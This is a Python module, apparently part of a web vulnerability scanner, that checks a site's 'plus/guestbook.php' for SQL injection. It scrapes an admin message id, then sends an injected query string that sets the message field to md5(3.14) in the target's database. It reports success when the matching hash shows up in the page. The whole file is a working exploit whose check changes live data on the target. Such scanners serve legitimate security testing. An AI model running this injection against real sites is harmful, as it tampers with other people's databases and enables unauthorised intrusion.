import requests
from termcolor import cprint
import re

class guestbook_sqli:

    def __init__(self,url):

        self.url =url

    def checksql(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate"
        }
        payload = 'plus/guestbook.php'
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:

            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200:
                m = re.search(r'admin&id=(\d+)', r.text)
                if m:
                    a = m.group(1)
                    payload1 = 'plus/guestbook.php?action=admin&job=editok&id='
                    payload2 = "&msg=%27,msg=md5(3.14),email=%27"
                    payload3 = payload1 + a + payload2
                    vulnurl = url + payload3
                    result = requests.get(url=vulnurl,headers=headers)
                    if result.status_code == 200 and '4beed3b9c4a886067de0e3a094246f78' in result.text:
                        cprint("target may be guestbook.php SqlInject","red")

        except:

            return False
